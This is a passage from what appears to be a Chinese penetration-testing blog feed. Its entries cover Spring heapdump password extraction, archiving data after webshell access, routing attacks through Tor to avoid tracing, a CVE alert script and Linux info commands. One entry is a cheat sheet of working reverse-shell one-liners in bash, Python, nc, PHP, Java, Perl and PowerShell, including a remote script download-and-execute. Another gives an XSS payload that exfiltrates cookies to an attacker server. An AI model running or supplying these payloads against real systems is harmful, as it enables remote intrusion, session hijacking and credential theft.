&lt;li&gt;清华大学 &lt;a href=&quot;https://pypi.tuna.tsinghua.edu.cn/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pypi.tuna.tsinghua.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;中国科学技术大学 &lt;a href=&quot;http://pypi.mirrors.ustc.edu.cn/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://pypi.mirrors.ustc.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;u&gt;提示：若担心安全问题可使用HTTPS加密源&lt;/u&gt;&lt;/p&gt;
&lt;h3 id=&quot;修改源的方法&quot;&gt;&lt;a href=&quot;#修改源的方法&quot; class=&quot;headerlink&quot; title=&quot;修改源的方法&quot;&gt;&lt;/a&gt;修改源的方法&lt;/h3&gt;&lt;h4 id=&quot;临时使用：&quot;&gt;&lt;a href=&quot;#临时使用：&quot; class=&quot;headerlink&quot; title=&quot;临时使用：&quot;&gt;&lt;/a&gt;临时使用：&lt;/h4&gt;&lt;p&gt;Linux Mac Windows通用命令
    
    </summary>
    
    
      <category term="Programming" scheme="http://yoursite.com/categories/Programming/"/>
    
    
  </entry>
  
  <entry>
    <title>MAT 查找 spring heapdump中的密码明文</title>
    <link href="http://yoursite.com/2020/spring.html"/>
    <id>http://yoursite.com/2020/spring.html</id>
    <published>2020-11-05T07:46:45.000Z</published>
    <updated>2021-04-14T06:13:20.537Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p><h3 id="二、查找方法："><a href="#二、查找方法：" class="headerlink" title="二、查找方法："></a>二、查找方法：</h3><p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure><p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：</p><img src="../images/upload/2020110501.png" style="zoom: 33%;" /><a id="more"></a>所以也可以用<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">"password"</span>))</span><br></pre></td></tr></table></figure><p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p><img src="../images/upload/2020110502.png" style="zoom: 33%;" /><p>所以也可以用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.LinkedHashMap$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">"password"</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一、简介：&quot;&gt;&lt;a href=&quot;#一、简介：&quot; class=&quot;headerlink&quot; title=&quot;一、简介：&quot;&gt;&lt;/a&gt;一、简介：&lt;/h3&gt;&lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。&lt;/p&gt;
&lt;h3 id=&quot;二、查找方法：&quot;&gt;&lt;a href=&quot;#二、查找方法：&quot; class=&quot;headerlink&quot; title=&quot;二、查找方法：&quot;&gt;&lt;/a&gt;二、查找方法：&lt;/h3&gt;&lt;p&gt;使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; * &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; org.springframework.web.context.support.StandardServletEnvironment&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：&lt;/p&gt;
&lt;img src=&quot;../images/upload/2020110501.png&quot; style=&quot;zoom: 33%;&quot; /&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>源码或文件打包</title>
    <link href="http://yoursite.com/2020/%E6%BA%90%E7%A0%81%E6%88%96%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85.html"/>
    <id>http://yoursite.com/2020/%E6%BA%90%E7%A0%81%E6%88%96%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85.html</id>
    <published>2020-10-13T08:54:00.000Z</published>
    <updated>2021-04-14T06:13:20.540Z</updated>
    
    <content type="html"><![CDATA[<p>​        在我们拿下webshell的时候，想要获取数据或者源码往往会用菜刀或者蚁剑去打包，但是这个时候往往就会出现很多问题，列如打包失败，或者是打包得不完整等等。</p><p>这个时候如果对方是windows服务器的话，我们可以将winrar安装包中的winrar.exe或者本地装的<code>winrar.exe</code>上传过去</p><img src="../images/upload/winrar.jpg" style="zoom:50%;" /><a id="more"></a><p>压缩盘下的data文件夹，并且命名为bak.rar  <code>winrar.exe a -ag -k -r -s -ibck c:/bak.rar c:/data/</code></p><p>压缩多个文件 <code>winrar a -ag -ibck bak.rar filename1 filename2 filename....</code></p><p>参数说明： <code>a</code> :备份所有文件； <code>-ag</code> :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名bakYYYYMMDDHHMMSS.rar； <code>-k</code> :锁定压缩文件； <code>-r</code>:备份目录和子目录； <code>-s</code> :创建固实压缩文件； <code>-ibck</code>:后台运行；</p><p><code>filename1</code>：要压缩的文件名，可以多个，也可用通配符`file*</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​        在我们拿下webshell的时候，想要获取数据或者源码往往会用菜刀或者蚁剑去打包，但是这个时候往往就会出现很多问题，列如打包失败，或者是打包得不完整等等。&lt;/p&gt;
&lt;p&gt;这个时候如果对方是windows服务器的话，我们可以将winrar安装包中的winrar.exe或者本地装的&lt;code&gt;winrar.exe&lt;/code&gt;上传过去&lt;/p&gt;
&lt;img src=&quot;../images/upload/winrar.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>Tor的使用与Penetration</title>
    <link href="http://yoursite.com/2020/tor%E4%BD%BF%E7%94%A8.html"/>
    <id>http://yoursite.com/2020/tor%E4%BD%BF%E7%94%A8.html</id>
    <published>2020-08-09T04:36:53.000Z</published>
    <updated>2021-04-14T06:13:20.538Z</updated>
    
    <content type="html"><![CDATA[<p>Tor主要用来访问匿名网络也就是已<code>.onion</code>结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在Penetration中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址</p><p>官方解释：<font color=green>Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。</font><a id="more"></a></p><h3 id="0x01-访问Tor的方式"><a href="#0x01-访问Tor的方式" class="headerlink" title="0x01 访问Tor的方式"></a>0x01 访问Tor的方式</h3><hr><p>1、直接使用Tor Browser浏览器，内置Tor Project加上Firefox浏览器–<code>推荐</code></p><p>2、源码安装Tor Project，然后配合其它浏览器使用–<code>Geek</code></p><h3 id="0x02-安装Tor-Browser浏览器"><a href="#0x02-安装Tor-Browser浏览器" class="headerlink" title="0x02 安装Tor Browser浏览器"></a>0x02 安装Tor Browser浏览器</h3><hr><p>下载地址：<br>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/torbrowser-install-win64-9.5.3_zh-CN.exe</code></p><p>Mac  os：<code>https://www.torproject.org/dist/torbrowser/9.5.3/TorBrowser-9.5.3-osx64_zh-CN.dmg</code></p><p>之后的安装过程就和其它程序一样了，这里不在赘述</p><h3 id="0x03-安装Tor-Project"><a href="#0x03-安装Tor-Project" class="headerlink" title="0x03 安装Tor Project"></a>0x03 安装Tor Project</h3><hr><p>Mac OS：<code>brew install tor</code></p><p>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/tor-win32-0.4.3.6.zip</code></p><h3 id="0x04-Tor-配置文件"><a href="#0x04-Tor-配置文件" class="headerlink" title="0x04 Tor 配置文件"></a>0x04 Tor 配置文件</h3><hr><p>Mac OS:<br><code>/usr/local/Cellar/tor/</code> :Tor的安装路径<br><code>/usr/local/etc/tor/torrc</code>  :Tor的配置文件</p><p>Windows:<br><code>解压后的存放路径</code>  : Tor的安装路径<br><code>同路径下tor/torrc</code>  :Tor的配置文件</p><p>Mac：在下面路径<code>/usr/local/etc/tor</code>找到文件<code>torrc.sample</code>，拷贝一份命名为<code>torrc</code><br>Windows：双击tor.exe后会生成torrc文件，然后再编辑</p><p>常用配置的参数：</p><table><thead><tr><th>参数</th><th>作用</th><th></th></tr></thead><tbody><tr><td>Socks5Proxy</td><td>前置 Socks 代理端口</td><td></td></tr><tr><td>HTTPProxy</td><td>前置 HTTP 代理端口</td><td></td></tr><tr><td>HTTPSProxy</td><td>前置 HTTPS 代理端口</td><td></td></tr><tr><td>SocksProt</td><td>外部程序访问 Tor 的端口</td><td></td></tr><tr><td>MaxCircuitDirtiness</td><td>自动切换 ip 的时间间隔</td><td></td></tr></tbody></table><p>我的配置：</p><img src="../images/upload/tor1.png" style="zoom: 67%;" /><h3 id="0x05-确认是否接入Tor网络"><a href="#0x05-确认是否接入Tor网络" class="headerlink" title="0x05 确认是否接入Tor网络"></a>0x05 确认是否接入Tor网络</h3><hr><p>启动Tor：</p><p>Mac：<code>tor</code> 命令<br>Windows：双击<code>tor.exe</code></p><p>配置Tor生成的本地代理</p><p><img src="../images/upload/tor2.png" alt=""></p><p>访问 <code>https://check.torproject.org/</code></p><img src="/Users/tbo/github/hexo/source/images/upload/tor4.png" style="zoom: 33%;" /><h3 id="0x06-配合Burp-Suite使用"><a href="#0x06-配合Burp-Suite使用" class="headerlink" title="0x06 配合Burp Suite使用"></a>0x06 配合Burp Suite使用</h3><hr><p>在Burp Suite中配置tor本地代理地址，浏览器中配置bp的代理</p><p>User options-&gt;Connetctions</p><img src="../images/upload/tor3.png" style="zoom:50%;" /><p>OK,可以开始使用了<br><img src="../images/upload/tor5.png" style="zoom:50%;" /></p><img src="../images/upload/tor6.png" style="zoom:50%;" /><h3 id="0x07-最后"><a href="#0x07-最后" class="headerlink" title="0x07 最后"></a>0x07 最后</h3><p>使用Tor的注意事项⚠️：</p><p>1、<strong>请勿将您的手机在 Tor 上用于两步验证</strong><br>2、<strong>不要在 TOR 之外操作用户帐户</strong><br>3、<strong>不要发布有关您的任何个人信息</strong><br>4、<strong>不要通过 TOR 发送未加密的数据</strong><br>5、<strong>不要忘记删除 cookies 和本地网站数据</strong><br>6、<strong>请勿将 TOR 用于 Google 搜索</strong><br>7、<strong>不要在 TOR 上打开 HTTP 网站</strong><br>8、<strong>不要同时使用 Tor 和不使用 Tor 访问同一台服务器</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tor主要用来访问匿名网络也就是已&lt;code&gt;.onion&lt;/code&gt;结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在Penetration中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址&lt;/p&gt;
&lt;p&gt;官方解释：&lt;font color=green&gt;Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。&lt;/font&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>实现每日推送CVE漏洞</title>
    <link href="http://yoursite.com/2020/CVE%E4%BF%A1%E6%81%AF.html"/>
    <id>http://yoursite.com/2020/CVE%E4%BF%A1%E6%81%AF.html</id>
    <published>2020-07-13T09:02:07.000Z</published>
    <updated>2021-04-14T06:26:31.206Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>随着安全工作的开展，关注查看每天的CVE漏洞成了安全从业人员的日常事项，你可能从公众号、朋友圈或其它漏洞平台获取漏洞信息， 但这些都不可能完全满足你想要的信息，比如你只关心tomcat、zabbix、fastjson等组件的漏洞，所以我开始想如何自动化的推送漏洞信息</font><a id="more"></a></p><h2 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h2><h3 id="1、获取CVE数据："><a href="#1、获取CVE数据：" class="headerlink" title="1、获取CVE数据："></a>1、获取CVE数据：</h3><p>可以爬取CVE官方网站每日公布的漏洞信息，但是当日漏洞没有漏洞定级和CVSS评分；而CVSS的评分需要NVD(美国国家漏洞数据库)，所以我这里直接选择使用NVD提供的api获取漏洞信息</p><p><img src="../images/upload/cve_01.png" alt=""></p><h3 id="2、漏洞信息过滤："><a href="#2、漏洞信息过滤：" class="headerlink" title="2、漏洞信息过滤："></a>2、漏洞信息过滤：</h3><p>获取的漏洞信息可能多可能少，而我们只需要获得想要的信息便可，比如只想获取2020-07-08号的高危漏洞情况</p><p><img src="../images/upload/cve_02.png" alt=""></p><h3 id="3、消息推送："><a href="#3、消息推送：" class="headerlink" title="3、消息推送："></a>3、消息推送：</h3><p>通过企业微信的api进行消息的推送<br><img src="../images/upload/cve_03.png" alt=""></p><h3 id="4、定时推送："><a href="#4、定时推送：" class="headerlink" title="4、定时推送："></a>4、定时推送：</h3><p>放在服务器上建立定时任务，比如每天上班前8:50推送消息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 08 * * * /usr/bin/python3 cve.py</span><br></pre></td></tr></table></figure><h3 id="5、效果展示："><a href="#5、效果展示：" class="headerlink" title="5、效果展示："></a>5、效果展示：</h3><p><img src="../images/upload/cve_04.jpg" alt=""></p><p><img src="../images/upload/cve_05.jpg" alt=""></p><h3 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h3><p>有些事情做起来没什么难度，但你的想法、思考很重要…获取源码方式，请公众号内回复’CVE’即可</p><hr><p>参考链接：</p><p><a href="https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement" target="_blank" rel="noopener">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement</a><br><a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;随着安全工作的开展，关注查看每天的CVE漏洞成了安全从业人员的日常事项，你可能从公众号、朋友圈或其它漏洞平台获取漏洞信息， 但这些都不可能完全满足你想要的信息，比如你只关心tomcat、zabbix、fastjson等组件的漏洞，所以我开始想如何自动化的推送漏洞信息&lt;/font&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>常见反向shell方法</title>
    <link href="http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html"/>
    <id>http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html</id>
    <published>2020-07-09T07:55:34.000Z</published>
    <updated>2021-04-14T06:26:05.171Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见反向shell生成与使用方法："><a href="#常见反向shell生成与使用方法：" class="headerlink" title="常见反向shell生成与使用方法："></a>常见反向shell生成与使用方法：</h2><p>​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。</p><h3 id="Bash："><a href="#Bash：" class="headerlink" title="Bash："></a>Bash：</h3><p>​    Attacker：nc  -lvvp  4444</p><p>​    Victimer：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p><p>​    Victimer：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.1.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure><h3 id="Netcat-nc-："><a href="#Netcat-nc-：" class="headerlink" title="Netcat(nc)："></a>Netcat(nc)：</h3><p>​    如果目标机器存在nc且有-e参数，那么可以使用nc建立反向shell</p><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e  /bin/bash  Attacker_IP 4444</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="Perl："><a href="#Perl：" class="headerlink" title="Perl："></a>Perl：</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">1.130</span> <span class="literal">-port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure><h3 id="Xterm："><a href="#Xterm：" class="headerlink" title="Xterm："></a>Xterm：</h3><p>​    Victimer:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display Attacker_IP:1</span><br></pre></td></tr></table></figure><p>​    Attacker:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xnest :1</span><br><span class="line">xhost +Victimer_IP</span><br></pre></td></tr></table></figure><h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常见反向shell生成与使用方法：&quot;&gt;&lt;a href=&quot;#常见反向shell生成与使用方法：&quot; class=&quot;headerlink&quot; title=&quot;常见反向shell生成与使用方法：&quot;&gt;&lt;/a&gt;常见反向shell生成与使用方法：&lt;/h2&gt;&lt;p&gt;​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。&lt;/p&gt;
&lt;h3 id=&quot;Bash：&quot;&gt;&lt;a href=&quot;#Bash：&quot; class=&quot;headerlink&quot; title=&quot;Bash：&quot;&gt;&lt;/a&gt;Bash：&lt;/h3&gt;&lt;p&gt;​    Attacker：nc  -lvvp  4444&lt;/p&gt;
&lt;p&gt;​    Victimer：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i  &amp;gt;&amp;amp; /dev/tcp/Attacker_IP/4444  0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>简易xss平台 获取Cookie</title>
    <link href="http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html"/>
    <id>http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html</id>
    <published>2020-06-30T07:38:52.000Z</published>
    <updated>2020-07-05T05:26:02.534Z</updated>
    
    <content type="html"><![CDATA[<p>1、启用python http服务器</p><img src="../images/upload/python3.png" style="zoom:67%;" /><p>2、在有xss的地方插入截获代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.109/'</span>+<span class="built_in">document</span>.cookie+<span class="string">'" width=0 height=0 border=0 /&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>3、等待管理员触发漏洞后，便会截获到cookie</p><img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、启用python http服务器&lt;/p&gt;
&lt;img src=&quot;../images/upload/python3.png&quot; style=&quot;zoom:67%;&quot; /&gt;

&lt;p&gt;2、在有xss的地方插入截获代码&lt;/p&gt;
&lt;figure class=&quot;highlight jav
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux 查看硬件架构|系统版本|内核版本</title>
    <link href="http://yoursite.com/2020/linux%E7%89%88%E6%9C%AC.html"/>
    <id>http://yoursite.com/2020/linux%E7%89%88%E6%9C%AC.html</id>
    <published>2020-06-24T03:01:58.000Z</published>
    <updated>2021-04-14T06:04:32.872Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p><h3 id="一、查看系统架构"><a href="#一、查看系统架构" class="headerlink" title="一、查看系统架构"></a>一、查看系统架构</h3><ul><li><strong>hostnamectl</strong> 工具是用来管理给定主机中使用的三种类型的主机名，可以提供有关你的机器的最基本的信息。</li></ul><p><code>hostnamectl status</code></p><img src="../images/upload/hostnamectl.png" alt="hostnamectl" style="zoom:50%;" /><a id="more"></a><ul><li><p><strong>lscpu</strong>命令从sysfs和/proc/cpuinfo收集cpu体系结构信息，命令的输出比较易读，命令输出的信息包含cpu数量，线程，核数，套接字等。</p><img src="../images/upload/lscpu.png" style="zoom:50%;" /></li><li><p><strong>arch</strong>命令主要用于显示当前主机的硬件结构类型，arch命令输出的结果有：i386、i486、mips、alpha等。</p><img src="../images/upload/arch.png" style="zoom: 67%;" /></li><li><p><strong>uname</strong>命令的英文全称即“Unix name”，用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。<br>-m 显示计算机硬件架构；-i  显示硬件平台</p><img src="../images/upload/uname1.png" style="zoom: 67%;" /></li></ul><h3 id="二、查看系统发行版本"><a href="#二、查看系统发行版本" class="headerlink" title="二、查看系统发行版本"></a>二、查看系统发行版本</h3><ul><li><p><strong>LSB</strong>是Linux Standard Base的缩写，lsb_release命令用来显示LSB和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v参数。</p><p>-d 显示系统全称和版本号；-a  显示LSB所有信息</p><img src="../images/upload/lsb_release.png" style="zoom:50%;" /></li><li><p><strong>/etc/*-release</strong>文件通常被视为操作系统的标识。在 <code>/etc</code> 目录下放置了很多记录着发行版各种信息的文件，每个发行版都各自有一套这样记录着相关信息的文件。</p><p>其中 <code>/etc/redhat-release</code> 和 <code>/etc/system-release</code>,<code>/etc/os-release</code> 文件是指向 <code>/etc/[发行版名称]-release</code> 文件的一个连接。</p><img src="../images/upload/cat1.png" style="zoom:50%;" /></li></ul><h3 id="三、查看内核版本"><a href="#三、查看内核版本" class="headerlink" title="三、查看内核版本"></a>三、查看内核版本</h3><ul><li><p><strong>uname</strong>用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。</p><p>-r 显示当前系统的内核版本; -s 显示内核名称</p><img src="../images/upload/uname2.png" style="zoom: 67%;" /></li><li><p><strong>/proc/version</strong>文件记录了 Linux 内核的版本、用于编译内核的 gcc 的版本、内核编译的时间，以及内核编译者的用户名。</p><p><img src="../images/upload/proc.png" alt=""></p></li><li><p><strong>dmesg</strong>（展示信息display message 或驱动程序信息driver message）是大多数类 Unix 操作系统上的一个命令，用于打印内核的消息缓冲区的信息。</p><p><img src="../images/upload/dmesg.png" alt=""></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;一、查看系统架构&quot;&gt;&lt;a href=&quot;#一、查看系统架构&quot; class=&quot;headerlink&quot; title=&quot;一、查看系统架构&quot;&gt;&lt;/a&gt;一、查看系统架构&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;hostnamectl&lt;/strong&gt; 工具是用来管理给定主机中使用的三种类型的主机名，可以提供有关你的机器的最基本的信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;hostnamectl status&lt;/code&gt;&lt;/p&gt;
